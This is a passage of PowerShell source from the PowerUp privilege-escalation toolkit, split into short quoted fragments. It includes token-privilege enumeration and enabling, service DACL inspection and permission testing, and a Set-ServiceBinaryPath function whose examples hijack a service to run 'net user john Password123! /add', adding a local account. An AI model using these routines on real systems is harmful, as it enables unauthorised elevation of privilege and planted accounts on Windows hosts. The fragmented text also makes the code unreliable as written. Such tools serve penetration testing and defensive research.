    ','        $TOK','EN_QUERY = 0','x0008
      ','      $Succe','ss = $Advapi','32::OpenProc','essToken($Pr','ocessHandle,',' $TOKEN_QUER','Y, [ref]$hPr','ocToken);$La','stError = [R','untime.Inter','opServices.M','arshal]::Get','LastWin32Err','or()
       ','     if ($Su','ccess) {
   ','            ',' Get-TokenIn','formation -T','okenHandle $','hProcToken -','InformationC','lass ''Privil','eges'' | ForE','ach-Object {','
           ','         if ','($PSBoundPar','ameters[''Spe','cial'']) {
  ','            ','          if',' ($SpecialPr','ivileges -Co','ntains $_.Pr','ivilege) {
 ','            ','            ','   $_ | Add-','Member Notep','roperty ''Pro','cessId'' $Pro','cessID
     ','            ','           $','_ | Add-Memb','er Aliasprop','erty Name Pr','ocessId
    ','            ','            ','$_
         ','            ','   }
       ','            ',' }
         ','           e','lse {
      ','            ','      $_ | A','dd-Member No','teproperty ''','ProcessId'' $','ProcessID
  ','            ','          $_','
           ','         }
 ','            ','   }
       ','     }
     ','       else ','{
          ','      Write-','Warning ([Co','mponentModel','.Win32Except','ion] $LastEr','ror)
       ','     }

    ','        if (','$PSBoundPara','meters[''Id'']',') {
        ','        # cl','ose the hand','le if we use','d OpenProces','s()
        ','        $Nul','l = $Kernel3','2::CloseHand','le($ProcessH','andle)
     ','       }
   ','     }
    }','
}


functio','n Get-Proces','sTokenType {','
<#
.SYNOPSI','S

Returns t','he token typ','e and impers','onation leve','l.

Author: ','Will Schroed','er (@harmj0y',')  
License:',' BSD 3-Claus','e  
Required',' Dependencie','s: PSReflect',', Get-TokenI','nformation  ','

.DESCRIPTI','ON

First, i','f a process ','ID is passed',', then the p','rocess is op','ened using O','penProcess()',',
otherwise ','GetCurrentPr','ocess() is u','sed to open ','up a pseudoh','andle to the',' current pro','cess.
OpenPr','ocessToken()',' is then use','d to get a h','andle to the',' specified p','rocess token','. The token
','is then pass','ed to Get-To','kenInformati','on to query ','the type and',' impersonati','on level for',' the
specifi','ed token.

.','PARAMETER Id','

The proces','s ID to enum','erate token ','groups for, ','otherwise de','faults to th','e current pr','ocess.

.EXA','MPLE

Get-Pr','ocessTokenTy','pe

        ','       Type ',' Impersonati','onLevel     ','    TokenHan','dle         ','  ProcessId
','            ','   ----  ---','------------','---         ','----------- ','          --','-------
    ','        Prim','ary      Ide','ntification ','            ','    872     ','           3','684


.EXAMP','LE

Get-Proc','ess notepad ','| Get-Proces','sTokenType |',' fl

Type   ','            ',': Primary
Im','personationL','evel : Ident','ification
To','kenHandle   ','     : 1356
','ProcessId   ','       : 204','4

.OUTPUTS
','
PowerUp.Tok','enType

Outp','uts a custom',' object cont','aining the t','oken type an','d impersonat','ion level fo','r the specif','ied process.','
#>

    [Di','agnostics.Co','deAnalysis.S','uppressMessa','geAttribute(','''PSShouldPro','cess'', '''')]
','    [OutputT','ype(''PowerUp','.TokenType'')',']
    [Cmdle','tBinding()]
','    Param(
 ','       [Para','meter(Positi','on = 0, Valu','eFromPipelin','e = $True, V','alueFromPipe','lineByProper','tyName = $Tr','ue)]
       ',' [Alias(''Pro','cessID'')]
  ','      [UInt3','2]
        [','ValidateNotN','ullOrEmpty()',']
        $I','d
    )

   ',' PROCESS {
 ','       if ($','PSBoundParam','eters[''Id''])',' {
         ','   $ProcessH','andle = $Ker','nel32::OpenP','rocess(0x400',', $False, $I','d);$LastErro','r = [Runtime','.InteropServ','ices.Marshal',']::GetLastWi','n32Error()
 ','           i','f ($ProcessH','andle -eq 0)',' {
         ','       Write','-Warning ([C','omponentMode','l.Win32Excep','tion] $LastE','rror)
      ','      }
    ','        else',' {
         ','       $Proc','essID = $Id
','            ','}
        }
','        else',' {
         ','   # open up',' a pseudo ha','ndle to the ','current proc','ess- don''t n','eed to worry',' about closi','ng
         ','   $ProcessH','andle = $Ker','nel32::GetCu','rrentProcess','()
         ','   $ProcessI','D = $PID
   ','     }

    ','    if ($Pro','cessHandle) ','{
          ','  [IntPtr]$h','ProcToken = ','[IntPtr]::Ze','ro
         ','   $TOKEN_QU','ERY = 0x0008','
           ',' $Success = ','$Advapi32::O','penProcessTo','ken($Process','Handle, $TOK','EN_QUERY, [r','ef]$hProcTok','en);$LastErr','or = [Runtim','e.InteropSer','vices.Marsha','l]::GetLastW','in32Error()
','
           ',' if ($Succes','s) {
       ','         $To','kenType = Ge','t-TokenInfor','mation -Toke','nHandle $hPr','ocToken -Inf','ormationClas','s ''Type''
   ','            ',' $TokenType ','| ForEach-Ob','ject {
     ','            ','   $_ | Add-','Member Notep','roperty ''Pro','cessId'' $Pro','cessID
     ','            ','   $_
      ','          }
','            ','}
          ','  else {
   ','            ',' Write-Warni','ng ([Compone','ntModel.Win3','2Exception] ','$LastError)
','            ','}

         ','   if ($PSBo','undParameter','s[''Id'']) {
 ','            ','   # close t','he handle if',' we used Ope','nProcess()
 ','            ','   $Null = $','Kernel32::Cl','oseHandle($P','rocessHandle',')
          ','  }
        ','}
    }
}


','function Ena','ble-Privileg','e {
<#
.SYNO','PSIS

Enable','s a specific',' privilege f','or the curre','nt process.
','
Author: Wil','l Schroeder ','(@harmj0y)  ','
License: BS','D 3-Clause  ','
Required De','pendencies: ','PSReflect  
','
.DESCRIPTIO','N

Uses RtlA','djustPrivile','ge to enable',' a specific ','privilege fo','r the curren','t process.
P','rivileges ca','n be passed ','by string, o','r the output',' from Get-Pr','ocessTokenPr','ivilege
can ','be passed on',' the pipelin','e.

.EXAMPLE','

Get-Proces','sTokenPrivil','ege

       ','            ',' Privilege  ','            ','      Attrib','utes        ','            ',' ProcessId
 ','            ','       -----','----        ','            ','----------  ','            ','       -----','----
       ','   SeShutdow','nPrivilege  ','            ','        DISA','BLED        ','            ','      3620
 ','     SeChang','eNotifyPrivi','lege ...AULT',', SE_PRIVILE','GE_ENABLED  ','            ','            ','3620
       ','     SeUndoc','kPrivilege  ','            ','        DISA','BLED        ','            ','      3620
S','eIncreaseWor','kingSetPrivi','lege        ','            ','  DISABLED  ','            ','            ','3620
       ','   SeTimeZon','ePrivilege  ','            ','        DISA','BLED        ','            ','      3620

','Enable-Privi','lege SeShutd','ownPrivilege','

Get-Proces','sTokenPrivil','ege

       ','            ',' Privilege  ','            ','      Attrib','utes        ','            ',' ProcessId
 ','            ','       -----','----        ','            ','----------  ','            ','       -----','----
       ','   SeShutdow','nPrivilege  ','        SE_P','RIVILEGE_ENA','BLED        ','            ','      3620
 ','     SeChang','eNotifyPrivi','lege ...AULT',', SE_PRIVILE','GE_ENABLED  ','            ','            ','3620
       ','     SeUndoc','kPrivilege  ','            ','        DISA','BLED        ','            ','      3620
S','eIncreaseWor','kingSetPrivi','lege        ','            ','  DISABLED  ','            ','            ','3620
       ','   SeTimeZon','ePrivilege  ','            ','        DISA','BLED        ','            ','      3620

','.EXAMPLE

Ge','t-ProcessTok','enPrivilege
','
Privilege  ','            ','            ','            ','  Attributes','            ','         Pro','cessId
-----','----        ','            ','            ','        ----','------      ','            ','   ---------','
SeShutdownP','rivilege    ','            ','            ','    DISABLED','            ','            ','  2828
SeCha','ngeNotifyPri','vilege      ',' ...AULT, SE','_PRIVILEGE_E','NABLED      ','            ','        2828','
SeUndockPri','vilege      ','            ','            ','    DISABLED','            ','            ','  2828
SeInc','reaseWorking','SetPrivilege','            ','          DI','SABLED      ','            ','        2828','
SeTimeZoneP','rivilege    ','            ','            ','    DISABLED','            ','            ','  2828


Get','-ProcessToke','nPrivilege |',' Enable-Priv','ilege -Verbo','se
VERBOSE: ','Attempting t','o enable SeS','hutdownPrivi','lege
VERBOSE',': Attempting',' to enable S','eChangeNotif','yPrivilege
V','ERBOSE: Atte','mpting to en','able SeUndoc','kPrivilege
V','ERBOSE: Atte','mpting to en','able SeIncre','aseWorkingSe','tPrivilege
V','ERBOSE: Atte','mpting to en','able SeTimeZ','onePrivilege','

Get-Proces','sTokenPrivil','ege

Privile','ge          ','            ','            ','      Attrib','utes        ','            ',' ProcessId
-','--------    ','            ','            ','            ','----------  ','            ','       -----','----
SeShutd','ownPrivilege','            ','        SE_P','RIVILEGE_ENA','BLED        ','            ','      2828
S','eChangeNotif','yPrivilege  ','     ...AULT',', SE_PRIVILE','GE_ENABLED  ','            ','            ','2828
SeUndoc','kPrivilege  ','            ','        SE_P','RIVILEGE_ENA','BLED        ','            ','      2828
S','eIncreaseWor','kingSetPrivi','lege        ','  SE_PRIVILE','GE_ENABLED  ','            ','            ','2828
SeTimeZ','onePrivilege','            ','        SE_P','RIVILEGE_ENA','BLED        ','            ','      2828

','.LINK

http:','//forum.sysi','nternals.com','/tip-easy-wa','y-to-enable-','privileges_t','opic15745.ht','ml
#>

    [','CmdletBindin','g()]
    Par','am(
        ','[Parameter(P','osition = 0,',' Mandatory =',' $True, Valu','eFromPipelin','e = $True, V','alueFromPipe','lineByProper','tyName = $Tr','ue)]
       ',' [Alias(''Pri','vileges'')]
 ','       [Vali','dateSet(''SeC','reateTokenPr','ivilege'', ''S','eAssignPrima','ryTokenPrivi','lege'', ''SeLo','ckMemoryPriv','ilege'', ''SeI','ncreaseQuota','Privilege'', ','''SeUnsolicit','edInputPrivi','lege'', ''SeMa','chineAccount','Privilege'', ','''SeTcbPrivil','ege'', ''SeSec','urityPrivile','ge'', ''SeTake','OwnershipPri','vilege'', ''Se','LoadDriverPr','ivilege'', ''S','eSystemProfi','lePrivilege''',', ''SeSystemt','imePrivilege',''', ''SeProfil','eSingleProce','ssPrivilege''',', ''SeIncreas','eBasePriorit','yPrivilege'',',' ''SeCreatePa','gefilePrivil','ege'', ''SeCre','atePermanent','Privilege'', ','''SeBackupPri','vilege'', ''Se','RestorePrivi','lege'', ''SeSh','utdownPrivil','ege'', ''SeDeb','ugPrivilege''',', ''SeAuditPr','ivilege'', ''S','eSystemEnvir','onmentPrivil','ege'', ''SeCha','ngeNotifyPri','vilege'', ''Se','RemoteShutdo','wnPrivilege''',', ''SeUndockP','rivilege'', ''','SeSyncAgentP','rivilege'', ''','SeEnableDele','gationPrivil','ege'', ''SeMan','ageVolumePri','vilege'', ''Se','ImpersonateP','rivilege'', ''','SeCreateGlob','alPrivilege''',', ''SeTrusted','CredManAcces','sPrivilege'',',' ''SeRelabelP','rivilege'', ''','SeIncreaseWo','rkingSetPriv','ilege'', ''SeT','imeZonePrivi','lege'', ''SeCr','eateSymbolic','LinkPrivileg','e'')]
       ',' [String[]]
','        $Pri','vilege
    )','

    PROCES','S {
        ','ForEach ($Pr','iv in $Privi','lege) {
    ','        [UIn','t32]$Previou','sState = 0
 ','           W','rite-Verbose',' "Attempting',' to enable $','Priv"
      ','      $Succe','ss = $NTDll:',':RtlAdjustPr','ivilege($Sec','urityEntity:',':$Priv, $Tru','e, $False, [','ref]$Previou','sState)
    ','        if (','$Success -ne',' 0) {
      ','          Wr','ite-Warning ','"RtlAdjustPr','ivilege for ','$Priv failed',': $Success"
','            ','}
        }
','    }
}


fu','nction Add-S','erviceDacl {','
<#
.SYNOPSI','S

Adds a Da','cl field to ','a service ob','ject returne','d by Get-Ser','vice.

Autho','r: Matthew G','raeber (@mat','tifestation)','  
License: ','BSD 3-Clause','  
Required ','Dependencies',': PSReflect ',' 

.DESCRIPT','ION

Takes o','ne or more S','erviceProces','s.ServiceCon','troller obje','cts on the p','ipeline and ','adds a
Dacl ','field to eac','h object. It',' does this b','y opening a ','handle with ','ReadControl ','for the
serv','ice with usi','ng the GetSe','rviceHandle ','Win32 API ca','ll and then ','uses
QuerySe','rviceObjectS','ecurity to r','etrieve a co','py of the se','curity descr','iptor for th','e service.

','.PARAMETER N','ame

An arra','y of one or ','more service',' names to ad','d a service ','Dacl for. Pa','ssable on th','e pipeline.
','
.EXAMPLE

G','et-Service |',' Add-Service','Dacl

Add Da','cls for ever','y service th','e current us','er can read.','

.EXAMPLE

','Get-Service ','-Name VMTool','s | Add-Serv','iceDacl

Add',' the Dacl to',' the VMTools',' service obj','ect.

.OUTPU','TS

ServiceP','rocess.Servi','ceController','

.LINK

htt','ps://rohnspo','wershellblog','.wordpress.c','om/2013/03/1','9/viewing-se','rvice-acls/
','#>

    [Dia','gnostics.Cod','eAnalysis.Su','ppressMessag','eAttribute(''','PSShouldProc','ess'', '''')]
 ','   [OutputTy','pe(''ServiceP','rocess.Servi','ceController',''')]
    [Cmd','letBinding()',']
    Param(','
        [Pa','rameter(Posi','tion = 0, Ma','ndatory = $T','rue, ValueFr','omPipeline =',' $True, Valu','eFromPipelin','eByPropertyN','ame = $True)',']
        [A','lias(''Servic','eName'')]
   ','     [String','[]]
        ','[ValidateNot','NullOrEmpty(',')]
        $','Name
    )

','    BEGIN {
','        filt','er Local:Get','-ServiceRead','ControlHandl','e {
        ','    [OutputT','ype([IntPtr]',')]
         ','   Param(
  ','            ','  [Parameter','(Mandatory =',' $True, Valu','eFromPipelin','e = $True)]
','            ','    [Validat','eNotNullOrEm','pty()]
     ','           [','ValidateScri','pt({ $_ -as ','''ServiceProc','ess.ServiceC','ontroller'' }',')]
         ','       $Serv','ice
        ','    )

     ','       $GetS','erviceHandle',' = [ServiceP','rocess.Servi','ceController','].GetMethod(','''GetServiceH','andle'', [Ref','lection.Bind','ingFlags] ''I','nstance, Non','Public'')
   ','         $Re','adControl = ','0x00020000
 ','           $','RawHandle = ','$GetServiceH','andle.Invoke','($Service, @','($ReadContro','l))
        ','    $RawHand','le
        }','
    }

    ','PROCESS {
  ','      ForEac','h($ServiceNa','me in $Name)',' {

        ','    $Individ','ualService =',' Get-Service',' -Name $Serv','iceName -Err','orAction Sto','p

         ','   try {
   ','            ',' Write-Verbo','se "Add-Serv','iceDacl Indi','vidualServic','e : $($Indiv','idualService','.Name)"
    ','            ','$ServiceHand','le = Get-Ser','viceReadCont','rolHandle -S','ervice $Indi','vidualServic','e
          ','  }
        ','    catch {
','            ','    $Service','Handle = $Nu','ll
         ','       Write','-Verbose "Er','ror opening ','up the servi','ce handle wi','th read cont','rol for $($I','ndividualSer','vice.Name) :',' $_"
       ','     }

    ','        if (','$ServiceHand','le -and ($Se','rviceHandle ','-ne [IntPtr]','::Zero)) {
 ','            ','   $SizeNeed','ed = 0

    ','            ','$Result = $A','dvapi32::Que','ryServiceObj','ectSecurity(','$ServiceHand','le, [Securit','y.AccessCont','rol.Security','Infos]::Disc','retionaryAcl',', @(), 0, [R','ef] $SizeNee','ded);$LastEr','ror = [Runti','me.InteropSe','rvices.Marsh','al]::GetLast','Win32Error()','

          ','      # 122 ','== The data ','area passed ','to a system ','call is too ','small
      ','          if',' ((-not $Res','ult) -and ($','LastError -e','q 122) -and ','($SizeNeeded',' -gt 0)) {
 ','            ','       $Bina','rySecurityDe','scriptor = N','ew-Object By','te[]($SizeNe','eded)

     ','            ','   $Result =',' $Advapi32::','QueryService','ObjectSecuri','ty($ServiceH','andle, [Secu','rity.AccessC','ontrol.Secur','ityInfos]::D','iscretionary','Acl, $Binary','SecurityDesc','riptor, $Bin','arySecurityD','escriptor.Co','unt, [Ref] $','SizeNeeded);','$LastError =',' [Runtime.In','teropService','s.Marshal]::','GetLastWin32','Error()

   ','            ','     if (-no','t $Result) {','
           ','            ',' Write-Error',' ([Component','Model.Win32E','xception] $L','astError)
  ','            ','      }
    ','            ','    else {
 ','            ','           $','RawSecurityD','escriptor = ','New-Object S','ecurity.Acce','ssControl.Ra','wSecurityDes','criptor -Arg','umentList $B','inarySecurit','yDescriptor,',' 0
         ','            ','   $Dacl = $','RawSecurityD','escriptor.Di','scretionaryA','cl | ForEach','-Object {
  ','            ','            ','  Add-Member',' -InputObjec','t $_ -Member','Type NotePro','perty -Name ','AccessRights',' -Value ($_.','AccessMask -','as $ServiceA','ccessRights)',' -PassThru
 ','            ','           }','
           ','            ',' Add-Member ','-InputObject',' $Individual','Service -Mem','berType Note','Property -Na','me Dacl -Val','ue $Dacl -Pa','ssThru
     ','            ','   }
       ','         }
 ','            ','   else {
  ','            ','      Write-','Error ([Comp','onentModel.W','in32Exceptio','n] $LastErro','r)
         ','       }
   ','            ',' $Null = $Ad','vapi32::Clos','eServiceHand','le($ServiceH','andle)
     ','       }
   ','     }
    }','
}


functio','n Set-Servic','eBinaryPath ','{
<#
.SYNOPS','IS

Sets the',' binary path',' for a servi','ce to a spec','ified value.','

Author: Wi','ll Schroeder',' (@harmj0y),',' Matthew Gra','eber (@matti','festation)  ','
License: BS','D 3-Clause  ','
Required De','pendencies: ','PSReflect  
','
.DESCRIPTIO','N

Takes a s','ervice Name ','or a Service','Process.Serv','iceControlle','r on the pip','eline and fi','rst opens up',' a
service h','andle to the',' service wit','h ConfigCont','rol access u','sing the Get','ServiceHandl','e
Win32 API ','call. Change','ServiceConfi','g is then us','ed to set th','e binary pat','h (lpBinaryP','athName/binP','ath)
to the ','string value',' specified b','y binPath, a','nd the handl','e is closed ','off.

Takes ','one or more ','ServiceProce','ss.ServiceCo','ntroller obj','ects on the ','pipeline and',' adds a
Dacl',' field to ea','ch object. I','t does this ','by opening a',' handle with',' ReadControl',' for the
ser','vice with us','ing the GetS','erviceHandle',' Win32 API c','all and then',' uses
QueryS','erviceObject','Security to ','retrieve a c','opy of the s','ecurity desc','riptor for t','he service.
','
.PARAMETER ','Name

An arr','ay of one or',' more servic','e names to s','et the binar','y path for. ','Required.

.','PARAMETER Pa','th

The new ','binary path ','(lpBinaryPat','hName) to se','t for the sp','ecified serv','ice. Require','d.

.EXAMPLE','

Set-Servic','eBinaryPath ','-Name VulnSv','c -Path ''net',' user john P','assword123! ','/add''

Sets ','the binary p','ath for ''Vul','nSvc'' to be ','a command to',' add a user.','

.EXAMPLE

','Get-Service ','VulnSvc | Se','t-ServiceBin','aryPath -Pat','h ''net user ','john Passwor','d123! /add''
','
Sets the bi','nary path fo','r ''VulnSvc'' ','to be a comm','and to add a',' user.

.OUT','PUTS

System','.Boolean

$T','rue if confi','guration suc','ceeds, $Fals','e otherwise.','

.LINK

htt','ps://msdn.mi','crosoft.com/','en-us/librar','y/windows/de','sktop/ms6819','87(v=vs.85).','aspx
#>

   ',' [Diagnostic','s.CodeAnalys','is.SuppressM','essageAttrib','ute(''PSUseSh','ouldProcessF','orStateChang','ingFunctions',''', '''')]
    ','[OutputType(','''System.Bool','ean'')]
    [','CmdletBindin','g()]
    Par','am(
        ','[Parameter(P','osition = 0,',' Mandatory =',' $True, Valu','eFromPipelin','e = $True, V','alueFromPipe','lineByProper','tyName = $Tr','ue)]
       ',' [Alias(''Ser','viceName'')]
','        [Str','ing[]]
     ','   [Validate','NotNullOrEmp','ty()]
      ','  $Name,

  ','      [Param','eter(Positio','n=1, Mandato','ry = $True)]','
        [Al','ias(''BinaryP','ath'', ''binPa','th'')]
      ','  [String]
 ','       [Vali','dateNotNullO','rEmpty()]
  ','      $Path
','    )

    B','EGIN {
     ','   filter Lo','cal:Get-Serv','iceConfigCon','trolHandle {','
           ',' [OutputType','([IntPtr])]
','            ','Param(
     ','           [','Parameter(Ma','ndatory = $T','rue, ValueFr','omPipeline =',' $True)]
   ','            ',' [ServicePro','cess.Service','Controller]
','            ','    [Validat','eNotNullOrEm','pty()]
     ','           $','TargetServic','e
          ','  )
        ','    $GetServ','iceHandle = ','[ServiceProc','ess.ServiceC','ontroller].G','etMethod(''Ge','tServiceHand','le'', [Reflec','tion.Binding','Flags] ''Inst','ance, NonPub','lic'')
      ','      $Confi','gControl = 0','x00000002
  ','          $R','awHandle = $','GetServiceHa','ndle.Invoke(','$TargetServi','ce, @($Confi','gControl))
 ','           $','RawHandle
  ','      }
    ','}

    PROCE','SS {

      ','  ForEach($I','ndividualSer','vice in $Nam','e) {

      ','      $Targe','tService = G','et-Service -','Name $Indivi','dualService ','-ErrorAction',' Stop
      ','      try {
','            ','    $Service','Handle = Get','-ServiceConf','igControlHan','dle -TargetS','ervice $Targ','etService
  ','          }
','            ','catch {
    ','            ','$ServiceHand','le = $Null
 ','            ','   Write-Ver','bose "Error ','opening up t','he service h','andle with r','ead control ','for $Individ','ualService :',' $_"
       ','     }

    ','        if (','$ServiceHand','le -and ($Se','rviceHandle ','-ne [IntPtr]','::Zero)) {

','            ','    $SERVICE','_NO_CHANGE =',' [UInt32]::M','axValue
    ','            ','$Result = $A','dvapi32::Cha','ngeServiceCo','nfig($Servic','eHandle, $SE','RVICE_NO_CHA','NGE, $SERVIC','E_NO_CHANGE,',' $SERVICE_NO','_CHANGE, "$P','ath", [IntPt','r]::Zero, [I','ntPtr]::Zero',', [IntPtr]::','Zero, [IntPt','r]::Zero, [I','ntPtr]::Zero',', [IntPtr]::','Zero);$LastE','rror = [Runt','ime.InteropS','ervices.Mars','hal]::GetLas','tWin32Error(',')

         ','       if ($','Result -ne 0',') {
        ','            ','Write-Verbos','e "binPath f','or $Individu','alService su','ccessfully s','et to ''$Path','''"
         ','           $','True
       ','         }
 ','            ','   else {
  ','            ','      Write-','Error ([Comp','onentModel.W','in32Exceptio','n] $LastErro','r)
         ','           $','Null
       ','         }

','            ','    $Null = ','$Advapi32::C','loseServiceH','andle($Servi','ceHandle)
  ','          }
','        }
  ','  }
}


func','tion Test-Se','rviceDaclPer','mission {
<#','
.SYNOPSIS

','Tests one or',' more passed',' services or',' service nam','es against a',' given permi','ssion set,
r','eturning the',' service obj','ects where t','he current u','ser have the',' specified p','ermissions.
','
Author: Wil','l Schroeder ','(@harmj0y), ','Matthew Grae','ber (@mattif','estation)  
','License: BSD',' 3-Clause  
','Required Dep','endencies: A','dd-ServiceDa','cl  

.DESCR','IPTION

Take','s a service ','Name or a Se','rviceProcess','.ServiceCont','roller on th','e pipeline, ','and first ad','ds
a service',' Dacl to the',' service obj','ect with Add','-ServiceDacl','. All group ','SIDs for the',' current
use','r are enumer','ated service','s where the ','user has som','e type of pe','rmission are',' filtered. T','he
services ','are then fil','tered agains','t a specifie','d set of per','missions, an','d services w','here the
cur','rent user ha','ve the speci','fied permiss','ions are ret','urned.

.PAR','AMETER Name
','
An array of',' one or more',' service nam','es to test a','gainst the s','pecified per','mission set.','

.PARAMETER',' Permissions','

A manual s','et of permis','sion to test',' again. One ','of:''QueryCon','fig'', ''Chang','eConfig'', ''Q','ueryStatus'',','
''EnumerateD','ependents'', ','''Start'', ''St','op'', ''PauseC','ontinue'', ''I','nterrogate'',',' UserDefined','Control'',
''D','elete'', ''Rea','dControl'', ''','WriteDac'', ''','WriteOwner'',',' ''Synchroniz','e'', ''AccessS','ystemSecurit','y'',
''Generic','All'', ''Gener','icExecute'', ','''GenericWrit','e'', ''Generic','Read'', ''AllA','ccess''

.PAR','AMETER Permi','ssionSet

A ','pre-defined ','permission s','et to test a',' specified s','ervice again','st. ''ChangeC','onfig'', ''Res','tart'', or ''A','llAccess''.

','.EXAMPLE

Ge','t-Service | ','Test-Service','DaclPermissi','on

Return a','ll service o','bjects where',' the current',' user can mo','dify the ser','vice configu','ration.

.EX','AMPLE

Get-S','ervice | Tes','t-ServiceDac','lPermission ','-PermissionS','et ''Restart''','

Return all',' service obj','ects that th','e current us','er can resta','rt.

.EXAMPL','E

Test-Serv','iceDaclPermi','ssion -Permi','ssions ''Star','t'' -Name ''Vu','lnSVC''

Retu','rn the VulnS','VC object if',' the current',' user has st','art permissi','ons.

.OUTPU','TS

ServiceP','rocess.Servi','ceController','

.LINK

htt','ps://rohnspo','wershellblog','.wordpress.c','om/2013/03/1','9/viewing-se','rvice-acls/
','#>

    [Dia','gnostics.Cod','eAnalysis.Su','ppressMessag','eAttribute(''','PSShouldProc','ess'', '''')]
 ','   [OutputTy','pe(''ServiceP','rocess.Servi','ceController',''')]
    [Cmd','letBinding()',']
    Param(','
        [Pa','rameter(Posi','tion = 0, Ma','ndatory = $T','rue, ValueFr','omPipeline =',' $True, Valu','eFromPipelin','eByPropertyN','ame = $True)',']
        [A','lias(''Servic','eName'', ''Ser','vice'')]
    ','    [String[',']]
        [','ValidateNotN','ullOrEmpty()',']
        $N','ame,

      ','  [String[]]','
        [Va','lidateSet(''Q','ueryConfig'',',' ''ChangeConf','ig'', ''QueryS','tatus'', ''Enu','merateDepend','ents'', ''Star','t'', ''Stop'', ','''PauseContin','ue'', ''Interr','ogate'', ''Use','rDefinedCont','rol'', ''Delet','e'', ''ReadCon','trol'', ''Writ','eDac'', ''Writ','eOwner'', ''Sy','nchronize'', ','''AccessSyste','mSecurity'', ','''GenericAll''',', ''GenericEx','ecute'', ''Gen','ericWrite'', ','''GenericRead',''', ''AllAcces','s'')]
       ',' $Permission','s,

        ','[String]
   ','     [Valida','teSet(''Chang','eConfig'', ''R','estart'', ''Al','lAccess'')]
 ','       $Perm','issionSet = ','''ChangeConfi','g''
    )

  ','  BEGIN {
  ','      $Acces','sMask = @{
 ','           ''','QueryConfig''','           =',' [uint32]''0x','00000001''
  ','          ''C','hangeConfig''','          = ','[uint32]''0x0','0000002''
   ','         ''Qu','eryStatus''  ','         = [','uint32]''0x00','000004''
    ','        ''Enu','merateDepend','ents''   = [u','int32]''0x000','00008''
     ','       ''Star','t''          ','       = [ui','nt32]''0x0000','0010''
      ','      ''Stop''','            ','      = [uin','t32]''0x00000','020''
       ','     ''PauseC','ontinue''    ','     = [uint','32]''0x000000','40''
        ','    ''Interro','gate''       ','    = [uint3','2]''0x0000008','0''
         ','   ''UserDefi','nedControl'' ','   = [uint32',']''0x00000100','''
          ','  ''Delete''  ','            ','  = [uint32]','''0x00010000''','
           ',' ''ReadContro','l''          ',' = [uint32]''','0x00020000''
','            ','''WriteDac''  ','            ','= [uint32]''0','x00040000''
 ','           ''','WriteOwner'' ','           =',' [uint32]''0x','00080000''
  ','          ''S','ynchronize'' ','          = ','[uint32]''0x0','0100000''
   ','         ''Ac','cessSystemSe','curity''  = [','uint32]''0x01','000000''
    ','        ''Gen','ericAll''    ','        = [u','int32]''0x100','00000''
     ','       ''Gene','ricExecute'' ','       = [ui','nt32]''0x2000','0000''
      ','      ''Gener','icWrite''    ','      = [uin','t32]''0x40000','000''
       ','     ''Generi','cRead''      ','     = [uint','32]''0x800000','00''
        ','    ''AllAcce','ss''         ','    = [uint3','2]''0x000F01F','F''
        }','

        $C','heckAllPermi','ssionsInSet ','= $False

  ','      if ($P','SBoundParame','ters[''Permis','sions'']) {
 ','           $','TargetPermis','sions = $Per','missions
   ','     }
     ','   else {
  ','          if',' ($Permissio','nSet -eq ''Ch','angeConfig'')',' {
         ','       $Targ','etPermission','s = @(''Chang','eConfig'', ''W','riteDac'', ''W','riteOwner'', ','''GenericAll''',', '' GenericW','rite'', ''AllA','ccess'')
    ','        }
  ','          el','seif ($Permi','ssionSet -eq',' ''Restart'') ','{
          ','      $Targe','tPermissions',' = @(''Start''',', ''Stop'')
  ','            ','  $CheckAllP','ermissionsIn','Set = $True ','# so we chec','k all permis','sions && sty','le
         ','   }
       ','     elseif ','($Permission','Set -eq ''All','Access'') {
 ','            ','   $TargetPe','rmissions = ','@(''GenericAl','l'', ''AllAcce','ss'')
       ','     }
     ','   }
    }

','    PROCESS ','{

        F','orEach($Indi','vidualServic','e in $Name) ','{

         ','   $TargetSe','rvice = $Ind','ividualServi','ce | Add-Ser','viceDacl

  ','          if',' ($TargetSer','vice -and $T','argetService','.Dacl) {

  ','            ','  # enumerat','e all group ','SIDs the cur','rent user is',' a part of
 ','            ','   $UserIden','tity = [Syst','em.Security.','Principal.Wi','ndowsIdentit','y]::GetCurre','nt()
       ','         $Cu','rrentUserSid','s = $UserIde','ntity.Groups',' | Select-Ob','ject -Expand','Property Val','ue
         ','       $Curr','entUserSids ','+= $UserIden','tity.User.Va','lue

       ','         For','Each($Servic','eDacl in $Ta','rgetService.','Dacl) {
    ','            ','    if ($Cur','rentUserSids',' -contains $','ServiceDacl.','SecurityIden','tifier) {

 ','            ','           i','f ($CheckAll','PermissionsI','nSet) {
    ','            ','            ','$AllMatched ','= $True
    ','            ','            ','ForEach($Tar','getPermissio','n in $Target','Permissions)',' {
         ','            ','           #',' check permi','ssions && st','yle
        ','            ','            ','if (($Servic','eDacl.Access','Rights -band',' $AccessMask','[$TargetPerm','ission]) -ne',' $AccessMask','[$TargetPerm','ission]) {
 ','            ','            ','           #',' Write-Verbo','se "Current ','user doesn''t',' have ''$Targ','etPermission',''' for $($Tar','getService.N','ame)"
      ','            ','            ','      $AllMa','tched = $Fal','se
         ','            ','            ','   break
   ','            ','            ','     }
     ','            ','           }','
           ','            ','     if ($Al','lMatched) {
','            ','            ','        $Tar','getService
 ','            ','            ','   }
       ','            ','     }
     ','            ','       else ','{
          ','            ','      ForEac','h($TargetPer','mission in $','TargetPermis','sions) {
   ','            ','            ','     # check',' permissions',' || style
  ','            ','            ','      if (($','ServiceDacl.','AceType -eq ','''AccessAllow','ed'') -and ($','ServiceDacl.','AccessRights',' -band $Acce','ssMask[$Targ','etPermission',']) -eq $Acce','ssMask[$Targ','etPermission',']) {
       ','            ','            ','     Write-V','erbose "Curr','ent user has',' ''$TargetPer','mission'' for',' $Individual','Service"
   ','            ','            ','         $Ta','rgetService
','            ','            ','            ','break
      ','            ','            ','  }
        ','            ','        }
  ','            ','          }
','            ','        }
  ','            ','  }
        ','    }
      ','      else {','
           ','     Write-V','erbose "Erro','r enumeratin','g the Dacl f','or service $','IndividualSe','rvice"
     ','       }
   ','     }
    }','
}


#######','############','############','############','############','#
#
# Servic','e enumeratio','n
#
########','############','############','############','############','

function G','et-UnquotedS','ervice {
<#
','.SYNOPSIS

R','eturns the n','ame and bina','ry path for ','services wit','h unquoted p','aths
that al','so have a sp','ace in the n','ame.

Author',': Will Schro','eder (@harmj','0y)  
Licens','e: BSD 3-Cla','use  
Requir','ed Dependenc','ies: Get-Mod','ifiablePath,',' Test-Servic','eDaclPermiss','ion  

.DESC','RIPTION

Use','s Get-WmiObj','ect to query',' all win32_s','ervice objec','ts and extra','ct out
the b','inary pathna','me for each.',' Then checks',' if any bina','ry paths hav','e a space
